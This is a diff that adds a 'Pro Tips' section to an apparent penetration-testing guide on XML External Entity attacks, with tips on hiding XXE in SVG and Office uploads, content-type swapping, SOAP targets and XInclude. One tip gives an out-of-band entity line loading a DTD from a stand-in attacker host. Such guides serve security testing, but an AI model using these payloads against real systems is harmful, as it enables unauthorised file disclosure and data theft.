@@ -130,6 +130,25 @@ Billion laughs / quadratic blowup entity expansion can crash parsers lacking lim
 
 - Keep parser libraries patched; defaults vary by version.
 
+## Pro Tips
+
+Practical advice from real engagements — use these to test faster and report better.
+
+!!! tip "SVG and Office files"
+    Upload XXE in `.svg`, `.docx`, `.xlsx` — parsers often enable entities.
+
+!!! tip "Blind XXE OOB"
+    Use external DTD: `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">`
+
+!!! tip "JSON content-type swap"
+    Send XML body with `Content-Type: application/json` — some parsers still parse XML.
+
+!!! tip "SOAP endpoints"
+    Legacy SOAP services are XXE goldmines — check WSDL importers.
+
+!!! tip "Disable resolution test"
+    If entities blocked, try XInclude in non-entity contexts.
+
 ## Testing Methodology
 
 Work through each phase in order. Every step has a checkbox — complete them all for thorough, reproducible coverage.
